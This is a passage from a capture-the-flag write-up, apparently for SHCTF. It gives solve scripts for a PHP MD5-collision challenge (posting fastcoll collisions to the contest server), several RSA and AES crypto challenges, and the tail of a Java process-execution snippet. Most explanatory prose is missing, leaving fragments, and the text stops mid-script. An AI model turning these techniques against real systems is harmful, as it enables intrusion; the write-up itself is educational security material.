</span></span><br><span class="line">            <span class="type">BufferedReader</span> <span class="variable">reader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(process.getInputStream()));</span><br><span class="line">            String line;</span><br><span class="line">            <span class="keyword">while</span> ((line = reader.readLine()) != <span class="literal">null</span>) &#123;</span><br><span class="line">                System.out.println(line);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// </span></span><br><span class="line">            process.waitFor();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException | InterruptedException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="md5-master"><a class="markdownIt-Anchor" href="#md5-master"></a> MD5 Master</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(__file__);</span><br><span class="line"></span><br><span class="line"><span class="variable">$master</span> = <span class="string">&quot;MD5 master!&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&quot;master1&quot;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&quot;master2&quot;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$master</span>.<span class="variable">$_POST</span>[<span class="string">&quot;master1&quot;</span>] !== <span class="variable">$master</span>.<span class="variable">$_POST</span>[<span class="string">&quot;master2&quot;</span>] &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$master</span>.<span class="variable">$_POST</span>[<span class="string">&quot;master1&quot;</span>]) === <span class="title function_ invoke__">md5</span>(<span class="variable">$master</span>.<span class="variable">$_POST</span>[<span class="string">&quot;master2&quot;</span>]))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$master</span> . <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;/flag&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;master? &lt;br&gt;&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>masterMD5<code>fastcoll</code>exe</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;sh_msg1.txt&quot;</span>, <span class="string">&#x27;rb&#x27;</span>)<span class="keyword">as</span> f:</span><br><span class="line">    a = f.read()[<span class="number">11</span>:]</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;sh_msg2.txt&quot;</span>, <span class="string">&#x27;rb&#x27;</span>)<span class="keyword">as</span> f:</span><br><span class="line">    b = f.read()[<span class="number">11</span>:]</span><br><span class="line">url = <span class="string">&#x27;http://entry.shc.tf:21869/&#x27;</span></span><br><span class="line">res = requests.post(url, data=&#123;<span class="string">&quot;master1&quot;</span>: a, <span class="string">&quot;master2&quot;</span>: b&#125;)</span><br><span class="line"><span class="built_in">print</span>(res.text)</span><br></pre></td></tr></table></figure><h2 id="crypto"><a class="markdownIt-Anchor" href="#crypto"></a> crypto</h2><h3 id="hello-crypto"><a class="markdownIt-Anchor" href="#hello-crypto"></a> Hello Crypto</h3><p><code>print(long_to_bytes(m).decode())</code></p><h3 id="ezaes"><a class="markdownIt-Anchor" href="#ezaes"></a> EzAES</h3><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;chall.py&quot;</span>, <span class="string">&#x27;rb&#x27;</span>)<span class="keyword">as</span> f:</span><br><span class="line">    file = f.readlines()</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> file:</span><br><span class="line">        <span class="built_in">print</span>(line.decode(), end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">c = <span class="string">b&#x27;\xd0\xe2d\xe5T\xf9\xd2\xc8U0\xfb\xc8\xcd]b\xf8\x85\xc8\xbe\xa4\xcc3c\x99[\xbd\t(f\x10\xb5D&gt;\xe0\xde\x05\x16\x0b\xdc\x92\xd3\xb0\x1f-PN\xa8P&#x27;</span></span><br><span class="line">iv = <span class="string">b&#x27;QWO\xa0\xe8tIvH\xbf\xed\x82~P\xac\xb4&#x27;</span></span><br><span class="line">key = <span class="string">b&#x27;\x10:\x0f~\x1bWl\xad\x7f\xf7\xb8\x91\x8f$\xd6\xeb&#x27;</span></span><br><span class="line">aes = AES.new(key, AES.MODE_CBC, iv)</span><br><span class="line"><span class="built_in">print</span>(aes.decrypt(c).decode())</span><br></pre></td></tr></table></figure><h3 id="factor"><a class="markdownIt-Anchor" href="#factor"></a> factor</h3><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> enc <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">prod</span>(<span class="params">iterable</span>):</span><br><span class="line">    result = <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> num <span class="keyword">in</span> iterable:</span><br><span class="line">        result *= num</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line">prime_list = [getPrime(<span class="number">64</span>) <span class="keyword">for</span> _ <span class="keyword">in</span>  <span class="built_in">range</span>(<span class="number">10</span>) ]</span><br><span class="line">N = prod(prime_list)</span><br><span class="line">p_list = random.sample(prime_list,<span class="number">7</span>)</span><br><span class="line">n = prod(p_list)</span><br><span class="line">c = <span class="built_in">pow</span>(m,e,n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;c = <span class="subst">&#123;c&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;N = <span class="subst">&#123;N&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure><p><code>yafu</code></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"></span><br><span class="line">c = <span class="number">982057246005841122681719726162449275140402636679137501643344871376145083063016298600959370629453243515753285445832736433034476775497</span></span><br><span class="line">N = <span class="number">111727941450518685645880500356518853696393581139199683397655873524434398483719707355658359575956205560295208672611108319343069181170539103809784492328225885104488345034732063873819178228473087</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">prime_list = [<span class="number">9750009592369937929</span>, <span class="number">17631783225707169887</span>, <span class="number">14897435311328090363</span>, <span class="number">12219342310321289621</span>, <span class="number">12027757975747737973</span>,</span><br><span class="line">              <span class="number">15158171038546021043</span>, <span class="number">16488560220293550973</span>, <span class="number">10283692020046850117</span>, <span class="number">11073201121963691101</span>, <span class="number">10429529301865387397</span>]</span><br><span class="line">p_all_list = <span class="built_in">list</span>(itertools.permutations(prime_list, <span class="number">7</span>))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> p_all_list:</span><br><span class="line">    phi = <span class="number">1</span></span><br><span class="line">    n = <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> p <span class="keyword">in</span> i:</span><br><span class="line">        phi *= p-<span class="number">1</span></span><br><span class="line">        n *= p</span><br><span class="line">    <span class="keyword">if</span> GCD(e, phi) == <span class="number">1</span>:</span><br><span class="line">        d = inverse(e, phi)</span><br><span class="line">        flag = long_to_bytes(<span class="built_in">pow</span>(c, d, n))</span><br><span class="line">        <span class="keyword">if</span> <span class="string">b&#x27;SHCTF&#x27;</span> <span class="keyword">in</span> flag:</span><br><span class="line">            <span class="built_in">print</span>(flag.decode())</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure><h3 id="d_known"><a class="markdownIt-Anchor" href="#d_known"></a> d_known</h3><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> flag <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line">p = getPrime(<span class="number">1024</span>)</span><br><span class="line">q = next_prime(p)</span><br><span class="line">n = p * q</span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line">d = inverse(e, (p-<span class="number">1</span>) * (q-<span class="number">1</span>))</span><br><span class="line">c = <span class="built_in">pow</span>(m, e, n)</span><br><span class="line"><span class="built_in">print</span>(c)</span><br><span class="line"><span class="built_in">print</span>(d)</span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">c = 5128269945205941681657162690752124645147095603307776642558620464753149474351813432516302175895967604322423895428085228263377444072843608756088456978614813713707998220343468702704788501256758288635169563164297803428146056603182717915240126485071421659045280467383314498992918502931984546850909367496851620848827787411420736564351902392039206384433279115493991042882911016903299425217764902721104855561290614026117785416484916861798527602885421517301667939650766352244742052165224414400947997222256406536694670357685537325088273890185902387069072204887202971094744552181245341549936791944865465378905842980222407851742</span></span><br><span class="line"><span class="string">d = 3790271832736808378164485821342007847088299208140809668714802444291303279665930976642897262924930591631798761435880895708714697550489226406467924717484448076572088547295409148608378512478441170191291934724323097031903250264336964541317492561494853799000315044170684567389237337841599036163417916443756372926924022073020766718666542437634977043398727757614795102093582095109387147251701718216785864028290558113041981262382167416454071080366899471219871742443782268440377640255755782371837790956244466349724371425724180875521438840621722917440786455543247168529379012719810694051987668057392173716950629707189238453793</span></span><br><span class="line"><span class="string">e = 0x10001</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure><p><code>d.bit_length()=2045</code>n<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>e</mi><mo></mo><mi>d</mi><mo></mo><mn>1</mn><mo>=</mo><mi>k</mi><mi></mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">e*d-1=k\phi(n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.46528em;vertical-align:0em;"></span><span class="mord mathnormal">e</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin"></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.77777em;vertical-align:-0.08333em;"></span><span class="mord mathnormal">d</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin"></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mord mathnormal"></span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi></mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo><mo></mo><mi>n</mi></mrow><annotation encoding="application/x-tex">\phi(n)\approx n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal"></span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel"></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathnormal">n</span></span></span></span>k[1,e]<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi></mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\phi(n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal"></span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span>pq</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> sympy <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">c = <span class="number">5128269945205941681657162690752124645147095603307776642558620464753149474351813432516302175895967604322423895428085228263377444072843608756088456978614813713707998220343468702704788501256758288635169563164297803428146056603182717915240126485071421659045280467383314498992918502931984546850909367496851620848827787411420736564351902392039206384433279115493991042882911016903299425217764902721104855561290614026117785416484916861798527602885421517301667939650766352244742052165224414400947997222256406536694670357685537325088273890185902387069072204887202971094744552181245341549936791944865465378905842980222407851742</span></span><br><span class="line">d = <span class="number">3790271832736808378164485821342007847088299208140809668714802444291303279665930976642897262924930591631798761435880895708714697550489226406467924717484448076572088547295409148608378512478441170191291934724323097031903250264336964541317492561494853799000315044170684567389237337841599036163417916443756372926924022073020766718666542437634977043398727757614795102093582095109387147251701718216785864028290558113041981262382167416454071080366899471219871742443782268440377640255755782371837790956244466349724371425724180875521438840621722917440786455543247168529379012719810694051987668057392173716950629707189238453793</span></span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line"><span class="built_in">print</span>(d.bit_length())</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, e):</span><br><span class="line">    <span class="keyword">if</span> (e*d-<span class="number">1</span>) % i != <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    phi = (e*d-<span class="number">1</span>)//i</span><br><span class="line">    p = gmpy2.iroot(phi, <span class="number">2</span>)[<span class="number">0</span>]</span><br><span class="line">    p = prevprime(p)</span><br><span class="line">    q = nextprime(p)</span><br><span class="line">    <span class="keyword">if</span> (p-<span class="number">1</span>)*(q-<span class="number">1</span>) == phi:</span><br><span class="line">        n = p*q</span><br><span class="line">        <span class="built_in">print</span>(long_to_bytes(<span class="built_in">pow</span>(c, d, n)).decode())</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><h3 id="baby_mod"><a class="markdownIt-Anchor" href="#baby_mod"></a> baby_mod</h3><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> enc <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line">p = getPrime(<span class="number">512</span>)</span><br><span class="line">q = getPrime(<span class="number">512</span>)</span><br><span class="line">r = getPrime(<span class="number">777</span>)</span><br><span class="line">t = getPrime(<span class="number">777</span>)</span><br><span class="line">tmp = getPrime(<span class="number">15</span>)</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">n = p*q</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;c = <span class="subst">&#123;<span class="built_in">pow</span>(m,e,n)&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;leak = <span class="subst">&#123;p*r-q*t-tmp&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;r = <span class="subst">&#123;r&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;t = <span class="subst">&#123;t&#125;</span>&quot;</span>)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">c = 25900013611745459234449421352128550791380405075852427844520047672976045705053669812761027512471099887955926922807763156068475467691843960238860198209869207050769506000272083846340089993442226307892271915673319497925726165266677353649105096919576206677557645681229463591571683344132256764727867218414475821414</span></span><br><span class="line"><span class="string">leak = 1315576698569519021825869605558080173961766113174117516895155642458801441613594247202719705730125235122134470528523180642252331178634029317505467190118181724443647215388521217342902429209926124347180537512385923020087294072947165058918179896904165121851416283369980345261683209548370901441893420488465961879888423704643272728339367303995737167427397015998668341503217114591217674582342979</span></span><br><span class="line"><span class="string">r = 449509105386333182769495605541266433612190248649889527500668938725282197092696225044504839710548395681491923335485736430311542544811714539401973591141967042310944552061762227459161233997399455785984753772614529066263632633766099414193</span></span><br><span class="line"><span class="string">t = 466570739651607385339907801250236144323523615960304899132337822754876522678249651820805564899362256608057888046522867494446053404906721052232912923778440295889959052577191557765649038942151814731893947704867634072305897918671425093691</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p><a href="https://dexterjie.github.io/2024/08/06/%E8%B5%9B%E9%A2%98%E5%A4%8D%E7%8E%B0/SRCTF/#Baby">https://dexterjie.github.io/2024/08/06//SRCTF/#Baby</a><br /></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># sage</span></span><br><span class="line">Ge = Matrix(ZZ,[</span><br><span class="line">    [leak,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>],</span><br><span class="line">    [r,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>],</span><br><span class="line">    [-t,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>],</span><br><span class="line">    [<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">2</span>^<span class="number">500</span>]</span><br><span class="line">])</span><br></pre></td></tr></table></figure><p><code>Lst4r</code><code>wp</code><code></code><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>p</mi><mi>r</mi><mo></mo><mi>q</mi><mi>t</mi><mo>=</mo><mi>l</mi><mi>e</mi><mi>a</mi><mi>k</mi><mo>+</mo><mi>t</mi><mi>e</mi><mi>m</mi><mi>p</mi></mrow><annotation encoding="application/x-tex">pr-qt=leak+temp</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7777700000000001em;vertical-align:-0.19444em;"></span><span class="mord mathnormal">p</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin"></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.80952em;vertical-align:-0.19444em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="mord mathnormal">t</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.77777em;vertical-align:-0.08333em;"></span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">e</span><span class="mord mathnormal">a</span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.80952em;vertical-align:-0.19444em;"></span><span class="mord mathnormal">t</span><span class="mord mathnormal">e</span><span class="mord mathnormal">m</span><span class="mord mathnormal">p</span></span></span></span><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>a</mi><mi>x</mi><mo>+</mo><mi>b</mi><mi>y</mi><mo>=</mo><mi>c</mi></mrow><annotation encoding="application/x-tex">ax+by=c</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.66666em;vertical-align:-0.08333em;"></span><span class="mord mathnormal">a</span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathnormal">b</span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathnormal">c</span></span></span></span><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>G</mi><mi>C</mi><mi>D</mi><mo stretchy="false">(</mo><mi>a</mi><mo separator="true">,</mo><mi>b</mi><mo stretchy="false">)</mo><mo>=</mo><mi>d</mi><mi mathvariant="normal"></mi><mi>c</mi></mrow><annotation encoding="application/x-tex">GCD(a,b)=d|c</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">G</span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mord mathnormal" style="margin-right:0.02778em;">D</span><span class="mopen">(</span><span class="mord mathnormal">a</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">b</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">d</span><span class="mord"></span><span class="mord mathnormal">c</span></span></span></span>GCD(a,b)=1<br /><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>a</mi><mi>x</mi><mo></mo><mi>b</mi><mi>y</mi><mo>=</mo><mi>c</mi></mrow><annotation encoding="application/x-tex">ax-by=c</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.66666em;vertical-align:-0.08333em;"></span><span class="mord mathnormal">a</span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin"></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathnormal">b</span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathnormal">c</span></span></span></span><br /><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>a</mi><mi>x</mi><mo></mo><mi>c</mi><mo stretchy="false">(</mo><mi>m</mi><mi>o</mi><mi>d</mi><mtext></mtext><mi>b</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">ax\equiv c(mod\ b)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.46375em;vertical-align:0em;"></span><span class="mord mathnormal">a</span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel"></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">c</span><span class="mopen">(</span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mspace"></span><span class="mord mathnormal">b</span><span class="mclose">)</span></span></span></span><br /><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>x</mi><mo>=</mo><mi>c</mi><mo></mo><msup><mi>a</mi><mrow><mo></mo><mn>1</mn></mrow></msup><mo stretchy="false">(</mo><mi>m</mi><mi>o</mi><mi>d</mi><mtext></mtext><mi>b</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">x=c*a^{-1}(mod\ b)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.46528em;vertical-align:0em;"></span><span class="mord mathnormal">c</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin"></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.064108em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"></span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mspace"></span><span class="mord mathnormal">b</span><span class="mclose">)</span></span></span></span><br /><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>y</mi><mo>=</mo><mo stretchy="false">(</mo><mi>a</mi><mi>x</mi><mo></mo><mi>c</mi><mo stretchy="false">)</mo><mi mathvariant="normal">/</mi><mi mathvariant="normal">/</mi><mi>b</mi></mrow><annotation encoding="application/x-tex">y=(ax-c)//b</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal">a</span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin"></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">c</span><span class="mclose">)</span><span class="mord">/</span><span class="mord">/</span><span class="mord mathnormal">b</span></span></span></span><br /></p><p><code>ab</code><code>XSCTF</code>()</p><p><code>egcd</code><code>egcd</code><br /><strong></strong></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">c = <span class="number">25900013611745459234449421352128550791380405075852427844520047672976045705053669812761027512471099887955926922807763156068475467691843960238860198209869207050769506000272083846340089993442226307892271915673319497925726165266677353649105096919576206677557645681229463591571683344132256764727867218414475821414</span></span><br><span class="line">leak = <span class="number">1315576698569519021825869605558080173961766113174117516895155642458801441613594247202719705730125235122134470528523180642252331178634029317505467190118181724443647215388521217342902429209926124347180537512385923020087294072947165058918179896904165121851416283369980345261683209548370901441893420488465961879888423704643272728339367303995737167427397015998668341503217114591217674582342979</span></span><br><span class="line">r = <span class="number">449509105386333182769495605541266433612190248649889527500668938725282197092696225044504839710548395681491923335485736430311542544811714539401973591141967042310944552061762227459161233997399455785984753772614529066263632633766099414193</span></span><br><span class="line">t = <span class="number">466570739651607385339907801250236144323523615960304899132337822754876522678249651820805564899362256608057888046522867494446053404906721052232912923778440295889959052577191557765649038942151814731893947704867634072305897918671425093691</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> tqdm(<span class="built_in">range</span>(<span class="number">2</span>**<span class="number">14</span>, <span class="number">2</span>**<span class="number">15</span>)):</span><br><span class="line">    p = (leak+i)*inverse(r, t) % t</span><br><span class="line">    q = (r*p-(leak+i))//t</span><br><span class="line">    <span class="keyword">if</span> q &gt; <span class="number">0</span>:</span><br><span class="line">        n = p*q</span><br><span class="line">        <span class="keyword">if</span> GCD(e,(p-<span class="number">1</span>)*(q-<span class="number">1</span>))==<span class="number">1</span>:</span><br><span class="line">            d = inverse(e, (p-<span class="number">1</span>)*(q-<span class="number">1</span>))</span><br><span class="line">            flag = long_to_bytes(<span class="built_in">pow</span>(c, d, n))</span><br><span class="line">            <span class="keyword">if</span> <span class="string">b&#x27;SHCTF&#123;&#x27;</span> <span class="keyword">in</span> flag:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;p = &#125;</span>&#x27;</span>)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;q = &#125;</span>&#x27;</span>)</span><br><span class="line">                <span class="built_in">print</span>(flag)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"><span class="comment"># p = 